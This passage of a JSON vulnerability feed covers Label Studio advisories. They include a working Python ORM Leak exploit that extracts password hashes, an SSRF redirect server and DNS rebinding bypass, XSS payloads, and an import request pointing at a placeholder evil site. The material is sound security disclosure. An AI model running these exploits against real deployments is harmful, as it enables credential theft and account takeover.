next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.8.2.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.8.2.post1/","requires_dist":["google-resumable-media (==2.3.3)","wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (>=2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.16)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.54rc0)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.8.2.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"11f67e153673a7ff276d88ac6505f2e0a130d35e5d3dabf50ee749ea4dc93656","md5":"54a5f69bf0b9bde54547204c5fb08568","sha256":"0c4e5b62262fe374add173217d0a16bdfc8fdd44410f6ad0f53d268595e5179a"},"downloads":-1,"filename":"label_studio-1.8.2.post1-py3-none-any.whl","has_sig":false,"md5_digest":"54a5f69bf0b9bde54547204c5fb08568","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":53087052,"upload_time":"2023-09-21T03:34:03","upload_time_iso_8601":"2023-09-21T03:34:03.171572Z","url":"https://files.pythonhosted.org/packages/11/f6/7e153673a7ff276d88ac6505f2e0a130d35e5d3dabf50ee749ea4dc93656/label_studio-1.8.2.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"7a54321afd0e1d048d023e737a78563d3b3564c77ec364435043cdb87df92520","md5":"2e11aabc4afbd283936da85bffcceb93","sha256":"d784f6787f4b99e50566c0271e9772358f90f3a192d1b96beede50798275ff33"},"downloads":-1,"filename":"label-studio-1.8.2.post1.tar.gz","has_sig":false,"md5_digest":"2e11aabc4afbd283936da85bffcceb93","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":52043753,"upload_time":"2023-09-21T03:34:08","upload_time_iso_8601":"2023-09-21T03:34:08.181850Z","url":"https://files.pythonhosted.org/packages/7a/54/321afd0e1d048d023e737a78563d3b3564c77ec364435043cdb87df92520/label-studio-1.8.2.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def 